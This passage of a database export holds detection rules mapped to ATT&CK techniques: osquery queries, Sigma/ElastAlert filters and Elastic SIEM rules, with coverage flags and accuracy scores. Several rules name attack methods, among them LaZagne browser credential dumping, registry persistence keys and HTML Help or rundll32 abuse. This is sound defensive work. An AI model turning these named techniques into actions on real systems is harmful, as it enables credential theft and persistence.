datetime(f.atime, 'unixepoch', 'UTC') as atime, datetime(f.ctime, 'unixepoch', 'UTC') as ctime, datetime(f.mtime, 'unixepoch', 'UTC') as mtime from file f LEFT JOIN users u on f.uid=u.uid where f.path like 'C:\\\\users\\\\%\\\\AppData\\\\local\\\\temp\\\\%' AND f.type='directory';", "select f.path,f.directory,u.username,f.hard_links,f.symlink,datetime(f.btime, 'unixepoch', 'UTC') as btime, datetime(f.atime, 'unixepoch', 'UTC') as atime, datetime(f.ctime, 'unixepoch', 'UTC') as ctime, datetime(f.mtime, 'unixepoch', 'UTC') as mtime from file f LEFT JOIN users u on f.uid=u.uid where f.path like 'C:\\\\Windows\\\\%' AND f.type='directory';", "SELECT hash.md5, path, file.filename, datetime(file.btime, 'unixepoch', 'UTC') as btime, datetime(file.atime, 'unixepoch', 'UTC') as atime, datetime(file.ctime, 'unixepoch', 'UTC') as ctime, datetime(file.mtime, 'unixepoch', 'UTC') as mtime FROM hash JOIN file USING (path) where path like 'C:\\\\users\\\\%\\\\AppData\\\\Roaming\\\\%' and type='regular';", "SELECT hash.md5, path, file.filename, datetime(file.btime, 'unixepoch', 'UTC') as btime, datetime(file.atime, 'unixepoch', 'UTC') as atime, datetime(file.ctime, 'unixepoch', 'UTC') as ctime, datetime(file.mtime, 'unixepoch', 'UTC') as mtime FROM hash JOIN file USING (path) where path like 'C:\\\\users\\\\%\\\\AppData\\\\Local\\\\%' and type='regular';", "SELECT hash.md5, path, file.filename, datetime(file.btime, 'unixepoch', 'UTC') as btime, datetime(file.atime, 'unixepoch', 'UTC') as atime, datetime(file.ctime, 'unixepoch', 'UTC') as ctime, datetime(file.mtime, 'unixepoch', 'UTC') as mtime FROM hash JOIN file USING (path) where path like 'C:\\\\Windows\\\\%' and type='regular';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
119	no	other	MacOS Dependency.	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1574.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Objective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
27	yes	other		#800080	Process monitoring,File monitoring	{"accuracy_score": 50}	T1555.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_lazagne_credential_dumping_browsers.yml", "elastalert": {"name": "credential_from_web_browsers_using_lazagne_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:*lazagne.exe browsers* AND process.executable:*lazagne.exe)"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects lazagne credential dumping for web browsers."}}], "custom": [{"filename": "win_lazagne_cred_dumping_browsers_spawning_process_elastalert.yml", "elastaalert": "name: spawning_child_process_using_lazagne_cred_dumping_0\\ndescription: Detects child process \\"cmd.exe\\" while doing lazagne credential dumping for web browsers.\\nindex: bhd10944_searchnode:so-*\\npriority: 2\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (process.executable:*cmd.exe AND process.parent.command_line:*lazagne.exe browsers* AND process.parent.executable:*lazagne.exe)\\ntype: any\\nalert:\\n- debug"}, {"filename": "win_lazagne_cred_dumping_browsers_create_file_elastalert.yml", "elastaalert": "name: file_creation_for_lazagne_cred_dumping_for_web_browsers_0\\ndescription: Detects creation of dll file using lazagne credential dumping for web browsers.\\nindex: bhd10944_searchnode:so-*\\npriority: 1\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (winlog.event_id:\\"11\\" AND process.executable:*lazagne.exe AND file.target:*dll)\\ntype: any\\nalert:\\n- debug\\n"}, {"filename": "sigma_sysmon_sysinternals_eula_accesschk.yml", "elastaalert": "name: sysinternal_toola_accesschk_accepteula_0\\ndescription: Detects the usage of Sysinternals Tools Accesschk\\nindex: bhd10944_searchnode:so-*\\npriority: 2\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (process.command_line:*accepteula* AND process.executable:*accesschk.exe)\\ntype: any\\nalert:\\n- debug\\n\\n\\n"}, {"filename": "sigma_sysmon_sysinternals_eula_accepted_using_accepteula.yml", "elastalert": "name: registry_modify_event_for_accepteula_using_Sysinternal_tools_Accesschk_0\\ndescription: Detects the registry modification for Sysinternals Tools due to accepteula\\nindex: bhd10944_searchnode:so-*\\npriority: 2\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (winlog.event_id:\\"13\\" AND process.executable:*accesschk.exe AND winlog.event_data.TargetObject:*EulaAccepted)\\ntype: any\\nalert:\\n- debug"}], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.name LIKE '%lazagne%';"], "elasticsiem": []}}}}}	2021-07-16 12:52:52.927851+00
99	yes	OSQuery		#008000	Process monitoring,Process commandline parameters	"{'accuracy_score': 90}"	T1218.011	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}, {"rule": "win_redmimicry_winnti_proc.yml", "elastalert": {"name": "redmimicry_winnti_playbook_execute_0", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "(process.args:(*gthread-3.6.dll* OR *\\\\Windows\\\\Temp\\\\tmp.bat* OR *sigcmm-2.4.dll*) AND process.executable:(*rundll32.exe* OR *cmd.exe*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects actions caused by the RedMimicry Winnti playbook"}}], "osquery": ["SELECT * FROM processes WHERE LOWER(name)='rundll32.exe';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
110	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1496	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT pid, name, ROUND((total_size * '10e-7'), 2) AS used FROM processes ORDER BY total_size DESC LIMIT 5;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
111	no	OSQuery		#FFFFFF	Process use of network,Process monitoring	"{'accuracy_score': 0}"	T1219	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
84	yes	other,OSQuery	["1. Attack, Detection and mitigation of this technique is dependent on specific deployment systems used in an org."]	#FFA500	Process monitoring,Process monitoring,Process use of network	"{'accuracy_score': 10}"	T1072	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Detection methods will vary depending on the type of third-party software or system and how it is typically used.\\", \\"Perform application deployment at regular times so that irregular deployment activity stands out.\\", \\"select * from process_events;\\"]"], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
100	no	OSQuery		#FFFFFF	Process use of network	"{'accuracy_score': 0}"	T1048.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
118	yes			#FFA500	Process monitoring,Process commandline parameters	"{'accuracy_score': 20}"	T1217	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';", "select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);"], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
168	yes	other		#FFA500	Packet capture	{"accuracy_score": 15}	T1573.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/detect-MHR.zeek"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-16 04:38:10.079606+00
137	no	other	["Need macOS machine to tryout attack and detection."]	#FFFFFF	API monitoring,Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1548.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1. Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed.\\", \\"2. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
184	yes	yaml,OSQuery		#008000	Process monitoring,Process commandline parameters,Windows Registry,Process commandline parameters,Process monitoring	{"accuracy_score": 90}	T1546.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_change_default_file_association.yml", "elastalert": {"name": "change_default_file_association_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:*cmd* AND process.command_line:*//c* AND process.command_line:*assoc*)"}}], "realert": {"minutes": 0}, "priority": 4, "description": "When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened."}}], "osquery": ["select * from registry where path like 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts\\\\%\\\\OpenWithProgids\\\\%';", "select * from windows_eventlog where channel='Microsoft-Windows-Sysmon/Operational' and eventid=1 and data like '%assoc%';"], "elasticsiem": [{"name": "Potentially user file association override", "query": "registry where event.action: \\"modification\\" and\\n registry.data.strings != null and\\n registry.path : \\"HKLM\\\\SOFTWARE\\\\Classes\\\\*\\" and\\n not user.id : \\"S-1-5-18\\""}]}}}}}	2021-07-22 10:53:15.345516+00
116	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1204.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='lsass.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='lsass.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent != (SELECT pid from processes where name='csrss.exe') AND LOWER(name)='conhost.exe') OR pid=(SELECT pid FROM processes WHERE parent != (SELECT pid from processes where name='csrss.exe') AND LOWER(name)='conhost.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent != (SELECT pid from processes where name='explorer.exe') AND LOWER(name)='chrome.exe') OR pid=(SELECT pid FROM processes WHERE parent != (SELECT pid from processes where name='explorer.exe') AND LOWER(name)='chrome.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad++.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad++.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='cmd.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='notepad.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='iexplore.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='iexplore.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='services.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='wininit.exe') AND LOWER(name)='services.exe');", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='firefox.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='firefox.exe');"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
454	yes		\N	#FFA500	Process monitoring,Process commandline parameters,Windows Registry,DLL monitoring,Binary file metadata,API monitoring	"{'accuracy_score': 30}"	T1218.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "rules\\\\windows\\\\process_creation\\\\win_control_panel_item.yml", "elastalert": {"name": "control_panel_items_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:*.cpl AND (NOT (process.command_line:(*\\\\System32\\\\* OR *%System%*)))) OR (process.command_line:*add* AND process.executable:*\\\\reg.exe AND process.command_line:(*CurrentVersion\\\\Control\\\\ Panel\\\\CPLs*)))"}}], "realert": {"minutes": 0}, "priority": 1, "description": "Detects the malicious use of a control panel item"}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
117	no	OSQuery		#FFFFFF	File monitoring,Process commandline parameters,Process monitoring	"{'accuracy_score': 0}"	T1486	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select path, size from file where path like 'C:\\\\Users\\\\%%' and mtime > (select local_time from time) - 100 and filename!= '.';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
40	yes	OSQuery		#FFA500	Process monitoring,Process commandline parameters	{"accuracy_score": 35}	T1016.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}, "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master"], "sigma": [{"rule": "git@10.11.93.198:/home/git/ACDS/Detection/Tools/Sigma/elastalert/network/T1016.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-16 04:11:59.919591+00
2	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1029	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
78	yes	OSQuery	P1	#008000	Windows Registry,Process monitoring	{"accuracy_score": 90}	T1037.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "sysmon_logon_scripts_userinitmprlogonscript_proc.yml", "elastalert": {"name": "logon_scripts__userinitmprlogonscript__0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(((process.parent.executable:*userinit.exe AND (NOT (process.executable:*explorer.exe))) AND (NOT (process.command_line:(*netlogon.bat* OR *UsrLogon.cmd*)))) OR process.command_line:*UserInitMprLogonScript*)"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects creation or execution of UserInitMprLogonScript persistence method"}}, {"rule": "sysmon_logon_scripts_userinitmprlogonscript_reg.yml", "elastalert": {"name": "logon_scripts__userinitmprlogonscript__registry_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "winlog.event_data.TargetObject:*UserInitMprLogonScript*"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects creation or execution of UserInitMprLogonScript persistence method"}}], "osquery": ["select * from registry where key='HKEY_CURRENT_USER\\\\\\\\Environment';", "select * from registry where key like 'HKEY_USERS\\\\%\\\\Environment';"], "elasticsiem": [{"name": "Uncommon Registry Persistence Change", "query": "registry where\\n  /* uncomment once stable length(registry.data.strings) > 0 and */\\n registry.path : (\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Terminal Server\\\\\\\\Install\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run\\\\\\\\*\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Terminal Server\\\\\\\\Install\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Runonce\\\\\\\\*\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\Load\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\Run\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows\\\\\\\\IconServiceLib\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\AppSetup\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Taskman\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\VmApplet\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\System\\\\\\\\Shell\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logoff\\\\\\\\Script\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logon\\\\\\\\Script\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Shutdown\\\\\\\\Script\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Startup\\\\\\\\Script\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\Explorer\\\\\\\\Run\\\\\\\\*\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Policies\\\\\\\\System\\\\\\\\Shell\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logoff\\\\\\\\Script\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Logon\\\\\\\\Script\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Shutdown\\\\\\\\Script\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Policies\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\System\\\\\\\\Scripts\\\\\\\\Startup\\\\\\\\Script\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Active Setup\\\\\\\\Installed Components\\\\\\\\*\\\\\\\\ShellComponent\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows CE Services\\\\\\\\AutoStartOnConnect\\\\\\\\MicrosoftActiveSync\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows CE Services\\\\\\\\AutoStartOnDisconnect\\\\\\\\MicrosoftActiveSync\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Ctf\\\\\\\\LangBarAddin\\\\\\\\*\\\\\\\\FilePath\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Exec\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Script\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Command Processor\\\\\\\\Autorun\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Ctf\\\\\\\\LangBarAddin\\\\\\\\*\\\\\\\\FilePath\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Exec\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Script\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Command Processor\\\\\\\\Autorun\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\*\\\\\\\\VerifierDlls\\",\\n      \\"HKLM\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\GpExtensions\\\\\\\\*\\\\\\\\DllName\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\SafeBoot\\\\\\\\AlternateShell\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\Wds\\\\\\\\rdpwd\\\\\\\\StartupPrograms\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Terminal Server\\\\\\\\WinStations\\\\\\\\RDP-Tcp\\\\\\\\InitialProgram\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\BootExecute\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\SetupExecute\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\Execute\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\Session Manager\\\\\\\\S0InitialCommand\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\ServiceControlManagerExtension\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\ControlSet*\\\\\\\\Control\\\\\\\\BootVerificationProgram\\\\\\\\ImagePath\\",\\n      \\"HKLM\\\\\\\\SYSTEM\\\\\\\\Setup\\\\\\\\CmdLine\\",\\n      \\"HKEY_USERS\\\\\\\\*\\\\\\\\Environment\\\\\\\\UserInitMprLogonScript\\") and\\n      \\n not registry.data.strings : (\\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\userinit.exe\\", \\"cmd.exe\\", \\"C:\\\\\\\\Program Files (x86)\\\\\\\\*.exe\\",\\n                              \\"C:\\\\\\\\Program Files\\\\\\\\*.exe\\") and\\n not (process.name : \\"rundll32.exe\\" and registry.path : \\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Internet Explorer\\\\\\\\Extensions\\\\\\\\*\\\\\\\\Script\\") and\\n not process.executable : (\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\msiexec.exe\\",\\n                           \\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\msiexec.exe\\",\\n                           \\"C:\\\\\\\\ProgramData\\\\\\\\Microsoft\\\\\\\\Windows Defender\\\\\\\\Platform\\\\\\\\*\\\\\\\\MsMpEng.exe\\",\\n                           \\"C:\\\\\\\\Program Files\\\\\\\\*.exe\\",\\n                           \\"C:\\\\\\\\Program Files (x86)\\\\\\\\*.exe\\")\\n"}]}}}}}	2021-08-19 13:41:32.631716+00
